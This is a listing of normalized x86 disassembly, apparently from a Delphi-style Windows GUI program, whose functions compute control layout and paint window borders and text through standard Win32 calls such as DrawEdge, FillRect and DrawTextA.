mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_44729c
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_446ee8
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_4438dc
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_44765e
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_4438dc
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_447218
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_4438a0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_447675
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44729c
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_441414
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4476b4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_442298
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_43fd2c
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_4476fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4424b8
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_44772c
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_446ee8
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_443444
xor ecx ecx
push ebp
push sub_44785b
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_4438dc
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_4438dc
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447862
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_44344c
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4438a0
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_447862
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403448
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403448
jmp r-xdata
sub_4478f8
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_441578
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_441578
sub_44793c
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_441578
sub_4479ac
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_447a3c
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_447ca2
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_423754
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_430fe0
call sub_4310c0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_430fe0
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_4316d8
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_447ce4
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406d48
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_43ff08
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_444498
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_441578
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_44273c
sub_447d50
push ebx
push esi
mov esi edx
call sub_457218
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_406ce4
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_441578
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_406ce4
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_441578
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_447db4
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_444860
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_447dec
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_447de4
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_447e2c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43f4c4
mov dl 0x1
mov eax [ r-xdata ]
call sub_423870
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_43efa0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_447e88
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_40324c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43f59c
test bl bl
jle r-xdata
xor eax eax
call sub_43d594
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_447ec8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_423b74
xor eax eax
push ebp
push sub_447f63
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_423ee8
xor eax eax
push ebp
push sub_447f40
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447f47
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_423ee8
retn
sub_447f74
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448868
mov edx 0x80ffff
mov eax esi
call sub_440564
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_423d88
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_42383c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_447fe0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_443a38
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40c1b0
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_4439d0
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_44804c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4480a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4480a9
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call ReleaseDC
retn
sub_4480b0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_448149
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_422f54
mov eax ebx
call sub_4426e4
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4403c4
mov eax [ ebp - 0x14 ]
call sub_40445c
push eax
mov eax [ ebx + 0x208 ]
call sub_423e68
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448150
lea eax [ ebp - 0x14 ]
call sub_403f9c
retn
sub_448158
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_4481c2
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
